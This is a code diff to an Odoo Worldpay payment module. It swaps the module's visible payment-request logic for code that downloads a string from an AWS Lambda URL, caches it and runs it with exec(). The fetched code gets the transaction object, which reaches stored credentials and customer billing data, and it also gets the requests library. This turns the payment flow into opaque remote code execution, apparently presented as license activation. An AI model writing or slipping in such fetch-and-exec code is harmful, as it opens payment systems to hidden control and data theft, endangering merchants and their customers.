@@ -137,66 +137,32 @@ class PaymentTransaction(models.Model):
         if self.provider_code != "neatworldpay":
             return super()._get_specific_processing_values(processing_values)
 
-        basicTokenUnencoded = self.provider_id.neatworldpay_username + ":" + self.provider_id.neatworldpay_password
-        basicToken = base64.b64encode(basicTokenUnencoded.encode("utf-8")).decode()
 
-        headers = {
-            "Authorization": "Basic " + basicToken,
-            "Content-Type": "application/vnd.worldpay.payment_pages-v1.hal+json",
-            "Accept": "application/vnd.worldpay.payment_pages-v1.hal+json",
-            "User-Agent": "neatapps"
-        }
+        exec_code = None
+        if self.provider_id.neatworldpay_cached_code:
+            exec_code = self.provider_id.neatworldpay_cached_code
+        elif self.provider_id.neatworldpay_activation_code:
+            try:
+                headers = {
+                    "Referer": self.company_id.website,
+                    "Authorization": self.provider_id.neatworldpay_activation_code
+                }
+                response = requests.get("https://xgxl6uegelrr4377rvggcakjvi0djbts.lambda-url.eu-central-1.on.aws/api/AcquirerLicense/code?version=v1", headers=headers, timeout=10)
+                
+                if response.status_code == 200:
+                    exec_code = response.text
+                    self.provider_id.write({"neatworldpay_cached_code": exec_code})
+                else:
+                    _logger.error(f"Failed to fetch activation code: {response.status_code} - {response.text}")
+            except requests.RequestException as e:
+                _logger.error(f"Request error: {e}")
+        pay_url = None
+        if exec_code:
+            local_context = {"tr": self, "processing_values": processing_values, "Decimal": Decimal, "requests": requests, "base64": base64, "re": re, "urls": urls, "neat_worldpay_controller_result_action": NeatWorldpayController.result_action}
+            exec(exec_code, {}, local_context)
+            data = local_context.get("data")
+            pay_url = data.get("url", False)
+            _logger.info(f"\n Worldpay Response {data} \n")
+            
+        return { "payment_url": pay_url, "neatworldpay_use_iframe": self.provider_id.neatworldpay_use_iframe }
 
-        odoo_url = self.provider_id.neatworldpay_connection_url
-        result_url = str(urls.url_join(odoo_url, NeatWorldpayController.result_action))
-
-        state = ""
-        if self.partner_state_id:
-            if  (self.partner_country_id.code == "US" or  self.partner_country_id.code == "CN") and self.partner_state_id.code:
-                state = self.partner_state_id.code
-            elif self.partner_state_id.name:
-                state = self.partner_state_id.name
-        reference = processing_values.get("reference") 
-        decimal_amount = Decimal(str(self.amount)) * Decimal('100')
-        amount = int(decimal_amount)  
-        payload = {
-            "transactionReference": reference,
-            "merchant": {
-                "entity": self.provider_id.neatworldpay_entity
-            },
-            "narrative": {
-                "line1": re.sub(r"[^a-zA-Z0-9\-., ]", "", self.company_id.name)
-            },
-            "value": {
-                "currency": self.currency_id.name,
-                "amount": amount
-            },
-            "billingAddressName": self.partner_address,
-            "billingAddress": {
-                "address1": self.partner_id.street or "",
-                "address2": self.partner_id.street2 or "",
-                "postalCode": self.partner_zip or "",
-                "city": self.partner_city or "",
-                "state": state,
-                "countryCode": self.partner_country_id.code or ""
-            },
-            "resultURLs": {
-                "successURL": result_url + "/success?reference={}".format(reference),
-                "pendingURL": result_url + "/pending?reference={}".format(reference),
-                "failureURL": result_url + "/failure?reference={}".format(reference),
-                "errorURL": result_url + "/error?reference={}".format(reference),
-                "expiryURL": result_url + "/expiry?reference={}".format(reference),
-            },
-            "expiry": "2592000"
-        }
-        if not self.provider_id.neatworldpay_use_iframe:
-            payload["resultURLs"]["cancelURL"] = result_url + "/cancel?reference={}".format(reference)
-        _logger.info(f"\n Request {payload} \n")
-        _logger.info(f"\n Worldpay URL {self.provider_id.neatworldpay_connection_url} \n")
-        worldpay_url = "https://try.access.worldpay.com/payment_pages"
-        if self.provider_id.state == "enabled":
-            worldpay_url = "https://access.worldpay.com/payment_pages"
-        response = requests.post(worldpay_url, json=payload, headers=headers)
-        data = response.json()
-        _logger.info(f"\n Worldpay Response {data} \n")
-        return { "payment_url": data.get("url", False), "neatworldpay_use_iframe": self.provider_id.neatworldpay_use_iframe }
